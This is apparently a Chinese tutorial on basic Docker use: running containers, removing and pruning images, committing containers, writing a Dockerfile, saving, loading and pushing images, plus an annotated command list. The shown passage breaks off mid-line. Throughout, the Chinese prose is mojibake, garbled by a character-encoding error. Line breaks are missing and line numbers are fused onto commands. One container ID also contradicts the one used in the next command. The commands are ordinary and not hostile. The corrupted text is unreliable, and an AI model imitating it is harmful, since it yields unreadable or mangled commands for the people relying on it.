/etc/os-releaseNAME="Ubuntu"VERSION="18.04.1 LTS (Bionic Beaver)"ID=ubuntuID_LIKE=debianPRETTY_NAME="Ubuntu 18.04.1 LTS"VERSION_ID="18.04"HOME_URL="https://www.ubuntu.com/"SUPPORT_URL="https://help.ubuntu.com/"BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"VERSION_CODENAME=bionicUBUNTU_CODENAME=bionic -itï¼šè¿™æ˜¯ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯ -iï¼šäº¤äº’å¼æ“ä½œï¼Œä¸€ä¸ªæ˜¯ -t ç»ˆç«¯ã€‚æˆ‘ä»¬è¿™é‡Œæ‰“ç®—è¿›å…¥ bash æ‰§è¡Œä¸€äº›å‘½ä»¤å¹¶æŸ¥çœ‹è¿”å›žç»“æžœï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦äº¤äº’å¼ç»ˆç«¯ã€‚ â€“rmï¼šè¿™ä¸ªå‚æ•°æ˜¯è¯´å®¹å™¨é€€å‡ºåŽéšä¹‹å°†å…¶åˆ é™¤ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸ºäº†æŽ’éšœéœ€æ±‚ï¼Œé€€å‡ºçš„å®¹å™¨å¹¶ä¸ä¼šç«‹å³åˆ é™¤ï¼Œé™¤éžæ‰‹åŠ¨ docker rmã€‚æˆ‘ä»¬è¿™é‡Œåªæ˜¯éšä¾¿æ‰§è¡Œä¸ªå‘½ä»¤ï¼Œçœ‹çœ‹ç»“æžœï¼Œä¸éœ€è¦æŽ’éšœå’Œä¿ç•™ç»“æžœï¼Œå› æ­¤ä½¿ç”¨ â€“rm å¯ä»¥é¿å…æµªè´¹ç©ºé—´ã€‚ ubuntu:18.04ï¼šè¿™æ˜¯æŒ‡ç”¨ ubuntu:18.04 é•œåƒä¸ºåŸºç¡€æ¥å¯åŠ¨å®¹å™¨ã€‚ bashï¼šæ”¾åœ¨é•œåƒååŽçš„æ˜¯ å‘½ä»¤ï¼Œè¿™é‡Œæˆ‘ä»¬å¸Œæœ›æœ‰ä¸ªäº¤äº’å¼ Shellï¼Œå› æ­¤ç”¨çš„æ˜¯ bashã€‚ è¿›å…¥å®¹å™¨åŽï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ Shell ä¸‹æ“ä½œï¼Œæ‰§è¡Œä»»ä½•æ‰€éœ€çš„å‘½ä»¤ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬æ‰§è¡Œäº† cat /etc/os-releaseï¼Œè¿™æ˜¯ Linux å¸¸ç”¨çš„æŸ¥çœ‹å½“å‰ç³»ç»Ÿç‰ˆæœ¬çš„å‘½ä»¤ï¼Œä»Žè¿”å›žçš„ç»“æžœå¯ä»¥çœ‹åˆ°å®¹å™¨å†…æ˜¯ Ubuntu 18.04.1 LTS ç³»ç»Ÿã€‚ æœ€åŽæˆ‘ä»¬é€šè¿‡ exit é€€å‡ºäº†è¿™ä¸ªå®¹å™¨ã€‚ Docker åˆ é™¤é•œåƒé€šè¿‡æ ‡ç­¾åˆ é™¤é•œåƒ é€šè¿‡å¦‚ä¸‹ä¸¤ä¸ªéƒ½å¯ä»¥åˆ é™¤é•œåƒï¼š 1docker rmi [image] æˆ–è€…ï¼š 1docker image rm [image] æ”¯æŒçš„å­å‘½ä»¤å¦‚ä¸‹ï¼š -f,-force: å¼ºåˆ¶åˆ é™¤é•œåƒï¼Œå³ä¾¿æœ‰å®¹å™¨å¼•ç”¨è¯¥é•œåƒï¼› -no-prune: ä¸è¦åˆ é™¤æœªå¸¦æ ‡ç­¾çš„çˆ¶é•œåƒï¼› ä¾‹å¦‚ï¼Œæˆ‘ä»¬æƒ³åˆ é™¤ä¸Šç« èŠ‚åˆ›å»ºçš„ qymua_mysql:5.7 é•œåƒï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1docker rmi qymua_mysql:5.7 å®žé™…ä¸Šï¼Œå½“åŒä¸€ä¸ªé•œåƒæ‹¥æœ‰å¤šä¸ªæ ‡ç­¾æ—¶ï¼Œæ‰§è¡Œ docker rmi å‘½ä»¤ï¼Œåªæ˜¯ä¼šåˆ é™¤äº†è¯¥é•œåƒä¼—å¤šæ ‡ç­¾ä¸­ï¼Œæ‚¨æŒ‡å®šçš„æ ‡ç­¾è€Œå·²ï¼Œå¹¶ä¸ä¼šå½±å“åŽŸå§‹çš„é‚£ä¸ªé•œåƒæ–‡ä»¶ã€‚ é‚£ä¹ˆï¼Œå¦‚æžœæŸä¸ªé•œåƒä¸å­˜åœ¨å¤šä¸ªæ ‡ç­¾ï¼Œå½“ä¸”ä»…å½“åªæœ‰ä¸€ä¸ªæ ‡ç­¾æ—¶ï¼Œæ‰§è¡Œåˆ é™¤å‘½ä»¤æ—¶ï¼Œæ‚¨å°±è¦å°å¿ƒäº†ï¼Œè¿™ä¼šå½»åº•åˆ é™¤é•œåƒã€‚ é€šè¿‡ ID åˆ é™¤é•œåƒ é™¤äº†é€šè¿‡æ ‡ç­¾åç§°æ¥åˆ é™¤é•œåƒï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡åˆ¶å®šé•œåƒ ID, æ¥åˆ é™¤é•œåƒï¼Œå¦‚ï¼š 1docker rmi ee7cbd482336 ä¸€æ—¦åˆ¶å®šäº†é€šè¿‡ ID æ¥åˆ é™¤é•œåƒï¼Œå®ƒä¼šå…ˆå°è¯•åˆ é™¤æ‰€æœ‰æŒ‡å‘è¯¥é•œåƒçš„æ ‡ç­¾ï¼Œç„¶åŽåœ¨åˆ é™¤é•œåƒæœ¬èº«ã€‚ åˆ é™¤é•œåƒçš„é™åˆ¶ åˆ é™¤é•œåƒå¾ˆç®€å•ï¼Œä½†ä¹Ÿä¸æ˜¯æˆ‘ä»¬ä½•æ—¶ä½•åœ°éƒ½èƒ½åˆ é™¤çš„ï¼Œå®ƒå­˜åœ¨ä¸€äº›é™åˆ¶æ¡ä»¶ã€‚ å½“é€šè¿‡è¯¥é•œåƒåˆ›å»ºçš„å®¹å™¨æœªè¢«é”€æ¯æ—¶ï¼Œé•œåƒæ˜¯æ— æ³•è¢«åˆ é™¤çš„ã€‚ é™¤éžé€šè¿‡æ·»åŠ  -f å­å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯å¼ºåˆ¶åˆ é™¤ï¼Œæ‰èƒ½ç§»é™¤æŽ‰è¯¥é•œåƒ 1docker rmi -f mysql:5.7 ä½†æ˜¯ï¼Œä¸€èˆ¬ä¸æŽ¨èè¿™æ ·æš´åŠ›çš„åšæ³•ï¼Œæ­£ç¡®çš„åšæ³•åº”è¯¥æ˜¯ï¼š å…ˆåˆ é™¤å¼•ç”¨è¿™ä¸ªé•œåƒçš„å®¹å™¨ï¼› å†åˆ é™¤è¿™ä¸ªé•œåƒï¼› ä¹Ÿå°±æ˜¯ï¼Œæ ¹æ®å¼•ç”¨è¯¥é•œåƒçš„å®¹å™¨ ID ( 9d59e2278553), æ‰§è¡Œåˆ é™¤å‘½ä»¤ï¼š 1docker rm 9d59e2278553 ç„¶åŽï¼Œå†æ‰§è¡Œåˆ é™¤é•œåƒçš„å‘½ä»¤ï¼š 1docker rmi 5cb3aa00f899 æ¸…ç†é•œåƒ æˆ‘ä»¬åœ¨ä½¿ç”¨ Docker ä¸€æ®µæ—¶é—´åŽï¼Œç³»ç»Ÿä¸€èˆ¬éƒ½ä¼šæ®‹å­˜ä¸€äº›ä¸´æ—¶çš„ã€æ²¡æœ‰è¢«ä½¿ç”¨çš„é•œåƒæ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤è¿›è¡Œæ¸…ç†ï¼š 1docker image prune å®ƒæ”¯æŒçš„å­å‘½ä»¤æœ‰ï¼š -a,--all: åˆ é™¤æ‰€æœ‰æ²¡æœ‰ç”¨çš„é•œåƒï¼Œè€Œä¸ä»…ä»…æ˜¯ä¸´æ—¶æ–‡ä»¶ï¼› -f,--forceï¼šå¼ºåˆ¶åˆ é™¤é•œåƒæ–‡ä»¶ï¼Œæ— éœ€å¼¹å‡ºæç¤ºç¡®è®¤ï¼› Docker åˆ›å»ºé•œåƒDocker åˆ›å»ºé•œåƒä¸»è¦æœ‰ä¸‰ç§ï¼š åŸºäºŽå·²æœ‰çš„é•œåƒåˆ›å»ºï¼› åŸºäºŽ Dockerfile æ¥åˆ›å»ºï¼› åŸºäºŽæœ¬åœ°æ¨¡æ¿æ¥å¯¼å…¥ï¼› æˆ‘ä»¬å°†ä¸»è¦ä»‹ç»å¸¸ç”¨çš„ 1ï¼Œ2 ä¸¤ç§ã€‚ åŸºäºŽå·²æœ‰çš„é•œåƒåˆ›å»º é€šè¿‡å¦‚ä¸‹å‘½ä»¤æ¥åˆ›å»ºï¼š 1docker container commit æ”¯æŒçš„å­å‘½ä»¤å¦‚ä¸‹ï¼š -a,--author=â€â€: ä½œè€…ä¿¡æ¯ï¼› -c,--change=[]: å¯ä»¥åœ¨æäº¤çš„æ—¶å€™æ‰§è¡Œ Dockerfile æŒ‡ä»¤ï¼Œå¦‚ CMDã€ENTRYPOINTã€ENVã€EXPOSEã€LABELã€ONBUILDã€USERã€VOLUMEã€WORIR ç­‰ï¼› -m,--message=â€â€: æäº¤ä¿¡æ¯ï¼› -p,--pause=true: æäº¤æ—¶ï¼Œæš‚åœå®¹å™¨è¿è¡Œã€‚ æŽ¥ä¸‹æ¥ï¼ŒåŸºäºŽæœ¬åœ°å·²æœ‰çš„ Ubuntu é•œåƒï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒï¼š é¦–å…ˆï¼Œè®©æˆ‘å°†å®ƒè¿è¡Œèµ·æ¥ï¼Œå¹¶åœ¨å…¶ä¸­åˆ›å»ºä¸€ä¸ª test.txt æ–‡ä»¶ï¼š å‘½ä»¤å¦‚ä¸‹ï¼š 123root@ubuntuweb:/# docker run -it ubuntu:latest /bin/bashroot@437b2645a468:/# touch test.txtroot@437b2645a468:/# exit åˆ›å»ºå®Œ test.txt æ–‡ä»¶åŽï¼Œéœ€è¦è®°ä½æ ‡æ³¨çš„å®¹å™¨ ID: a0a0c8cfec3a, ç”¨å®ƒæ¥æäº¤ä¸€ä¸ªæ–°çš„é•œåƒ(PS: ä½ ä¹Ÿå¯ä»¥é€šè¿‡åç§°æ¥æäº¤é•œåƒï¼Œè¿™é‡Œåªæ¼”ç¤ºé€šè¿‡ ID çš„æ–¹å¼)ã€‚ æ‰§è¡Œå‘½ä»¤ï¼š 1docker container commit -m "Added test.txt file" -a "QYMUA" 437b2645a468 test:0.1 æäº¤æˆåŠŸåŽï¼Œä¼šè¿”å›žæ–°åˆ›å»ºçš„é•œåƒ ID ä¿¡æ¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å†æ¬¡æŸ¥çœ‹æœ¬åœ°é•œåƒä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°æ–°åˆ›å»ºçš„ test:0.1 é•œåƒäº†ï¼š åŸºäºŽ Dockerfile åˆ›å»º é€šè¿‡ Dockerfile çš„æ–¹å¼æ¥åˆ›å»ºé•œåƒï¼Œæ˜¯æœ€å¸¸è§çš„ä¸€ç§æ–¹å¼äº†ï¼Œä¹Ÿæ˜¯æ¯”è¾ƒæŽ¨èçš„æ–¹å¼ã€‚Dockerfile æ˜¯ä¸€ä¸ªæ–‡æœ¬æŒ‡ä»¤æ–‡ä»¶ï¼Œå®ƒæè¿°äº†æ˜¯å¦‚ä½•åŸºäºŽä¸€ä¸ªçˆ¶é•œåƒï¼Œæ¥åˆ›å»ºä¸€ä¸ªæ–°é•œåƒçš„è¿‡ç¨‹ã€‚ ä¸‹é¢è®©æˆ‘ä»¬æ¥ç¼–å†™ä¸€ä¸ªç®€å•çš„ Dockerfile æ–‡ä»¶ï¼Œå®ƒæè¿°äº†åŸºäºŽ Ubuntu çˆ¶é•œåƒï¼Œå®‰è£… Python3 çŽ¯å¢ƒçš„é•œåƒï¼š 123FROM ubuntu:latestLABEL version="1.0" maintainer="QYMUA &lt;Qymua@github&gt;"RUN apt-get update &amp;&amp; \ apt-get install -y python3 &amp;&amp; \ apt-get clean &amp;&amp; \ rm -rf /var/lib/apt/lists/* åˆ›å»ºå®ŒæˆåŽï¼Œé€šè¿‡è¿™ä¸ª Dockerfile æ–‡ä»¶ï¼Œæ¥æž„å»ºæ–°çš„é•œåƒï¼Œæ‰§è¡Œå‘½ä»¤ï¼š 1docker image build -t python:3 . æ³¨æ„ï¼š å‘½ä»¤çš„æœ€åŽæœ‰ä¸ªç‚¹ï¼Œå¦‚æžœä¸åŠ çš„è¯ï¼Œä¼šæž„å»ºä¸æˆåŠŸ Docker å¯¼å‡º&amp;åŠ è½½é•œåƒé€šå¸¸æˆ‘ä»¬ä¼šæœ‰ä¸‹é¢è¿™ç§éœ€æ±‚ï¼Œéœ€è¦å°†é•œåƒåˆ†äº«ç»™åˆ«äººï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥å°†é•œåƒå¯¼å‡ºæˆ tar åŒ…ï¼Œåˆ«äººç›´æŽ¥é€šè¿‡åŠ è½½è¿™ä¸ª tar åŒ…ï¼Œå¿«é€Ÿåœ°å°†é•œåƒå¼•å…¥åˆ°æœ¬åœ°é•œåƒåº“ã€‚ è¦æƒ³ä½¿ç”¨è¿™ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸»è¦æ˜¯é€šè¿‡å¦‚ä¸‹ä¸¤ä¸ªå‘½ä»¤ï¼š docker save docker load å¯¼å‡ºé•œåƒ ä¾‹å¦‚ï¼Œæˆ‘ä»¬æƒ³è¦å°† test:0.1 é•œåƒå¯¼å‡ºæ¥ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š 1docker save -o test_0.1.tar test:0.1 æ‰§è¡ŒæˆåŠŸåŽï¼ŒæŸ¥çœ‹å½“å‰ç›®å½•ï¼š å¯ä»¥çœ‹åˆ° test_0.1.tar é•œåƒæ–‡ä»¶å·²ç»ç”Ÿæˆ åŠ è½½é•œåƒ åˆ«äººæ‹¿åˆ°äº†è¿™ä¸ª tar åŒ…åŽï¼Œè¦å¦‚ä½•å¯¼å…¥åˆ°æœ¬åœ°çš„é•œåƒåº“å‘¢ï¼Ÿ é€šè¿‡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 1docker load -i test_0.1.tar æˆ–è€…ï¼š 1docker load &lt; test_0.1.tar å¯¼å…¥æˆåŠŸåŽï¼ŒæŸ¥çœ‹æœ¬åœ°é•œåƒä¿¡æ¯ï¼Œä½ å°±å¯ä»¥èŽ·å¾—åˆ«äººåˆ†äº«çš„é•œåƒäº†ï¼æ€Žä¹ˆæ ·ï¼Œæ˜¯ä¸æ˜¯å¾ˆæ–¹ä¾¿å‘¢ï¼ Docker ä¸Šä¼ é•œåƒä»¥ä¸Šä¼ åˆ° Docker Hub ä¸Šä¸ºç¤ºä¾‹ï¼Œæ¼”ç¤º Docker å¦‚ä½•ä¸Šä¼ é•œåƒã€‚ èŽ·å– Docker ID æƒ³è¦ä¸Šä¼ é•œåƒåˆ° Docker Hub ä¸Šï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ³¨å†Œ Docker Hub è´¦å·ã€‚æ‰“å¼€ Docker Hub ç½‘å€ https://hub.docker.comï¼Œå¼€å§‹æ³¨å†Œï¼š ä½¿ç”¨æ–¹æ³•å’Œgithubå¤§è‡´ç›¸åŒï¼Œåˆ›å»ºä»“åº“å³å¯ ä¸Šä¼ é•œåƒ è¿›å…¥å‘½ä»¤è¡Œï¼Œç”¨æˆ‘ä»¬åˆšåˆšèŽ·å–çš„ Docker ID ä»¥åŠå¯†ç ç™»å½•ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š 1docker login å‘½ä»¤è¡Œç™»å½• Docker ID ç™»å½•æˆåŠŸåŽï¼Œæˆ‘ä»¬å¼€å§‹å‡†å¤‡ä¸Šä¼ æœ¬åœ°çš„ é•œåƒï¼š é¦–å…ˆï¼Œæˆ‘ä»¬å¯¹å…¶æ‰“ä¸€ä¸ªæ–°çš„æ ‡ç­¾ï¼Œå‰ç¼€ä¸Žæˆ‘ä»¬æ–°åˆ›å»ºçš„ Docker ID ã€ä»“åº“åä¿æŒä¸€è‡´: 1docker tag test:0.1 dockerID/test:0.1 æŸ¥çœ‹æœ¬åœ°ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæ ‡ç­¾æ‰“æˆåŠŸäº†ã€‚æ‰§è¡Œå‘½ä»¤ï¼š 1docker push dockerID/test:0.1 æ“ä½œDockerDockerå¸¸ç”¨å‘½ä»¤ Search images 1$ sudo docker search ubuntu å½“æˆ‘ä»¬éœ€è¦æ‹‰å–ä¸€ä¸ª docker é•œåƒï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1docker pull image_name image_name ä¸ºé•œåƒçš„åç§°ï¼Œè€Œå¦‚æžœæˆ‘ä»¬æƒ³ä»Ž Docker Hub ä¸ŠåŽ»ä¸‹è½½æŸä¸ªé•œåƒï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 1docker pull centos:latest centos:lastest æ˜¯é•œåƒçš„åç§°ï¼Œ Docker daemon å‘çŽ°æœ¬åœ°æ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„é•œåƒï¼Œä¼šè‡ªåŠ¨åŽ» Docker Hub ä¸ŠåŽ»ä¸‹è½½é•œåƒï¼Œä¸‹è½½å®ŒæˆåŽï¼Œè¯¥é•œåƒè¢«é»˜è®¤ä¿å­˜åˆ° /var/lib/docker ç›®å½•ä¸‹ã€‚ æŽ¥ç€æˆ‘ä»¬å¦‚æžœæƒ³æŸ¥çœ‹ä¸‹ä¸»æœºä¸‹å­˜åœ¨å¤šå°‘é•œåƒï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1docker images æˆ‘ä»¬è¦æƒ³çŸ¥é“å½“å‰æœ‰å“ªäº›å®¹å™¨åœ¨è¿è¡Œï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1docker ps -a -a æ˜¯æŸ¥çœ‹å½“å‰æ‰€æœ‰çš„å®¹å™¨ï¼ŒåŒ…æ‹¬æœªè¿è¡Œçš„ æˆ‘ä»¬è¯¥å¦‚ä½•åŽ»å¯¹ä¸€ä¸ªå®¹å™¨è¿›è¡Œå¯åŠ¨ï¼Œé‡å¯å’Œåœæ­¢å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 123docker start container_name/container_iddocker restart container_name/container_iddocker stop container_name/container_id è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¦‚æžœæƒ³è¿›å…¥åˆ°è¿™ä¸ªå®¹å™¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ attach å‘½ä»¤ï¼š 1docker attach container_name/container_id åˆ©ç”¨dockerfileæž„å»ºé•œåƒï¼š 1docker build -t qymua/nginx_web:0.1 . è§£é‡Šä¸€ä¸‹ï¼Œ -t æ˜¯ä¸ºæ–°é•œåƒè®¾ç½®ä»“åº“å’Œåç§°ï¼Œå…¶ä¸­ qymua ä¸ºä»“åº“åï¼Œ nginx_web ä¸ºé•œåƒåï¼Œ :0.1 ä¸ºæ ‡ç­¾ï¼ˆä¸æ·»åŠ ä¸ºé»˜è®¤ latest ï¼‰ é‚£å¦‚æžœæˆ‘ä»¬æƒ³è¿è¡Œè¿™ä¸ªå®¹å™¨ä¸­çš„é•œåƒçš„è¯ï¼Œå¹¶ä¸”è°ƒç”¨é•œåƒé‡Œé¢çš„ bash ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1docker run -t -i container_name/container_id /bin/bash docker run - è¿è¡Œä¸€ä¸ªå®¹å™¨ -t - åˆ†é…ä¸€ä¸ªï¼ˆä¼ªï¼‰tty (link is external) -i - äº¤äº’æ¨¡å¼ (so we can interact with it) ubuntu:14.04 - ä½¿ç”¨ ubuntu åŸºç¡€é•œåƒ 14.04 /bin/bash - è¿è¡Œå‘½ä»¤ bash shell é‚£å¦‚æžœè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬æƒ³åˆ é™¤æŒ‡å®šé•œåƒçš„è¯ï¼Œç”±äºŽ image è¢«æŸä¸ª container å¼•ç”¨ï¼ˆæ‹¿æ¥è¿è¡Œï¼‰ï¼Œå¦‚æžœä¸å°†è¿™ä¸ªå¼•ç”¨çš„ container é”€æ¯ï¼ˆåˆ é™¤ï¼‰ï¼Œé‚£ image è‚¯å®šæ˜¯ä¸èƒ½è¢«åˆ é™¤ã€‚æˆ‘ä»¬é¦–å…ˆå¾—å…ˆåŽ»åœæ­¢è¿™ä¸ªå®¹å™¨ï¼š 12docker psdocker stop container_name/container_id ç„¶åŽæˆ‘ä»¬ç”¨å¦‚ä¸‹å‘½ä»¤åŽ»åˆ é™¤è¿™ä¸ªå®¹å™¨ï¼š 1docker rm container_name/container_id ç„¶åŽè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†åŽ»åˆ é™¤è¿™ä¸ªé•œåƒï¼š 1docker rmi image_name æ­¤æ—¶ï¼Œå¸¸ç”¨çš„ Docker ç›¸å…³çš„å‘½ä»¤å°±è®²åˆ°è¿™é‡Œä¸ºæ­¢äº†ï¼Œæˆ‘ä»¬åœ¨åŽç»­çš„æ–‡ç« ä¸­è¿˜ä¼šåå¤åœ°æåˆ°è¿™äº›å‘½ä»¤ã€‚ Dockerå‘½ä»¤æŸ¥è¯¢åŸºæœ¬è¯­æ³• Docker å‘½ä»¤æœ‰ä¸¤å¤§ç±»ï¼Œå®¢æˆ·ç«¯å‘½ä»¤å’ŒæœåŠ¡ç«¯å‘½ä»¤ã€‚å‰è€…æ˜¯ä¸»è¦çš„æ“ä½œæŽ¥å£ï¼ŒåŽè€…ç”¨æ¥å¯åŠ¨ Docker Daemonã€‚ å®¢æˆ·ç«¯å‘½ä»¤ï¼šåŸºæœ¬å‘½ä»¤æ ¼å¼ä¸º docker [OPTIONS] COMMAND [argâ€¦]ï¼› æœåŠ¡ç«¯å‘½ä»¤ï¼šåŸºæœ¬å‘½ä»¤æ ¼å¼ä¸º dockerd [OPTIONS]ã€‚ å¯ä»¥é€šè¿‡ man docker æˆ– docker help æ¥æŸ¥çœ‹è¿™äº›å‘½ä»¤ã€‚ å®¢æˆ·ç«¯å‘½ä»¤é€‰é¡¹ â€“config=â€â€ï¼šæŒ‡å®šå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ï¼Œé»˜è®¤ä¸º ~/.dockerï¼› -D=true|falseï¼šæ˜¯å¦ä½¿ç”¨ debug æ¨¡å¼ã€‚é»˜è®¤ä¸å¼€å¯ï¼› -H, â€“host=[]ï¼šæŒ‡å®šå‘½ä»¤å¯¹åº” Docker å®ˆæŠ¤è¿›ç¨‹çš„ç›‘å¬æŽ¥å£ï¼Œå¯ä»¥ä¸º unix å¥—æŽ¥å­— unix:///path/to/socketï¼Œæ–‡ä»¶å¥æŸ„ fd://socketfd æˆ– tcp å¥—æŽ¥å­— tcp://[host[:port]]ï¼Œé»˜è®¤ä¸º unix:///var/run/docker.sockï¼› -l, â€“log-level=â€debug|info|warn|error|fatalâ€ï¼šæŒ‡å®šæ—¥å¿—è¾“å‡ºçº§åˆ«ï¼› â€“tls=true|falseï¼šæ˜¯å¦å¯¹ Docker å®ˆæŠ¤è¿›ç¨‹å¯ç”¨ TLS å®‰å…¨æœºåˆ¶ï¼Œé»˜è®¤ä¸ºå¦ï¼› â€“tlscacert=/.docker/ca.pemï¼šTLS CA ç­¾åçš„å¯ä¿¡è¯ä¹¦æ–‡ä»¶è·¯å¾„ï¼› â€“tlscert=/.docker/cert.pemï¼šTLS å¯ä¿¡è¯ä¹¦æ–‡ä»¶è·¯å¾„ï¼› â€“tlscert=/.docker/key.pemï¼šTLS å¯†é’¥æ–‡ä»¶è·¯å¾„ï¼› â€“tlsverify=true|falseï¼šå¯ç”¨ TLS æ ¡éªŒï¼Œé»˜è®¤ä¸ºå¦ã€‚ Dockerå‘½ä»¤å¸®åŠ©æ³¨é‡Š docker command 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051$ sudo docker # docker å‘½ä»¤å¸®åŠ©Commands: attach Attach to a running container # å½“å‰ shell ä¸‹ attach è¿žæŽ¥æŒ‡å®šè¿è¡Œé•œåƒ build Build an image from a Dockerfile # é€šè¿‡ Dockerfile å®šåˆ¶é•œåƒ commit Create a new image from a container's changes # æäº¤å½“å‰å®¹å™¨ä¸ºæ–°çš„é•œåƒ cp Copy files/folders from the containers filesystem to the host path # ä»Žå®¹å™¨ä¸­æ‹·è´æŒ‡å®šæ–‡ä»¶æˆ–è€…ç›®å½•åˆ°å®¿ä¸»æœºä¸­ create Create a new container # åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨ï¼ŒåŒ runï¼Œä½†ä¸å¯åŠ¨å®¹å™¨ diff Inspect changes on a container's filesystem # æŸ¥çœ‹ docker å®¹å™¨å˜åŒ– events Get real time events from the server # ä»Ž docker æœåŠ¡èŽ·å–å®¹å™¨å®žæ—¶äº‹ä»¶ exec Run a command in an existing container # åœ¨å·²å­˜åœ¨çš„å®¹å™¨ä¸Šè¿è¡Œå‘½ä»¤ export Stream the contents of a container as a tar archive # å¯¼å‡ºå®¹å™¨çš„å†…å®¹æµä½œä¸ºä¸€ä¸ª tar å½’æ¡£æ–‡ä»¶[å¯¹åº” import ] history Show the history of an image # å±•ç¤ºä¸€ä¸ªé•œåƒå½¢æˆåŽ†å² images List images # åˆ—å‡ºç³»ç»Ÿå½“å‰é•œåƒ import Create a new filesystem image from the contents of a tarball # ä»ŽtaråŒ…ä¸­çš„å†…å®¹åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ç³»ç»Ÿæ˜ åƒ[å¯¹åº” export] info Display system-wide information # æ˜¾ç¤ºç³»ç»Ÿç›¸å…³ä¿¡æ¯ inspect Return low-level information on a container # æŸ¥çœ‹å®¹å™¨è¯¦ç»†ä¿¡æ¯ kill Kill a running container # kill æŒ‡å®š docker å®¹å™¨ load Load an image from a tar archive # ä»Žä¸€ä¸ª tar åŒ…ä¸­åŠ è½½ä¸€ä¸ªé•œåƒ[å¯¹åº” save] login Register or Login to the docker registry server # æ³¨å†Œæˆ–è€…ç™»é™†ä¸€ä¸ª docker æºæœåŠ¡å™¨ logout Log out from a Docker registry server # ä»Žå½“å‰ Docker registry é€€å‡º logs Fetch the logs of a container # è¾“å‡ºå½“å‰å®¹å™¨æ—¥å¿—ä¿¡æ¯ port Lookup the public-facing port which is NAT-ed to PRIVATE_PORT # æŸ¥çœ‹æ˜ å°„ç«¯å£å¯¹åº”çš„å®¹å™¨å†…éƒ¨æºç«¯å£ pause Pause all processes within a container # æš‚åœå®¹å™¨ ps List containers # åˆ—å‡ºå®¹å™¨åˆ—è¡¨ pull Pull an image or a repository from the docker registry server # ä»Ždockeré•œåƒæºæœåŠ¡å™¨æ‹‰å–æŒ‡å®šé•œåƒæˆ–è€…åº“é•œåƒ push Push an image or a repository to the docker registry server # æŽ¨é€æŒ‡å®šé•œåƒæˆ–è€…åº“é•œåƒè‡³dockeræºæœåŠ¡å™¨ restart Restart a running container # é‡å¯è¿è¡Œçš„å®¹å™¨ rm Remove one or more containers # ç§»é™¤ä¸€ä¸ªæˆ–è€…å¤šä¸ªå®¹å™¨ rmi Remove one or more images # ç§»é™¤ä¸€ä¸ªæˆ–å¤šä¸ªé•œåƒ[æ— å®¹å™¨ä½¿ç”¨è¯¥é•œåƒæ‰å¯åˆ é™¤ï¼Œå¦åˆ™éœ€åˆ é™¤ç›¸å…³å®¹å™¨æ‰å¯ç»§ç»­æˆ– -f å¼ºåˆ¶åˆ é™¤] run Run a command in a new container # åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶è¿è¡Œä¸€ä¸ªå‘½ä»¤ save Save an image to a tar archive # ä¿å­˜ä¸€ä¸ªé•œåƒä¸ºä¸€ä¸ª tar åŒ…[å¯¹åº” load] search Search for an image on the Docker Hub # åœ¨ docker hub ä¸­æœç´¢é•œåƒ start Start a stopped containers # å¯åŠ¨å®¹å™¨ stop Stop a running containers # åœæ­¢å®¹å™¨ tag Tag an image into a repository # ç»™æºä¸­é•œåƒæ‰“æ ‡ç­¾ top Lookup the running processes of a container # æŸ¥çœ‹å®¹å™¨ä¸­è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯ unpause Unpause a paused container # å–æ¶ˆæš‚åœå®¹å™¨ version Show the docker version information # æŸ¥çœ‹ docker ç‰ˆæœ¬å· wait Block until a container stops, then print its exit code # æˆªå–å®¹å™¨åœæ­¢æ—¶çš„é€€å‡ºçŠ¶æ€å€¼Run 'docker COMMAND --help' for more information on a command. docker option 12345678910111213141516171819202122232425262728293031323334353637Usage of docker: --api-enable-cors=false Enable CORS headers in the remote API # è¿œç¨‹ API ä¸­å¼€å¯ CORS å¤´ -b, --bridge="" Attach containers to a pre-existing network bridge # æ¡¥æŽ¥ç½‘ç»œ use 'none' to disable container networking --bip="" Use this CIDR notation address for the network bridge's IP, not compatible with -b # å’Œ -b é€‰é¡¹ä¸å…¼å®¹ï¼Œå…·ä½“æ²¡æœ‰æµ‹è¯•è¿‡ -d, --daemon=false Enable 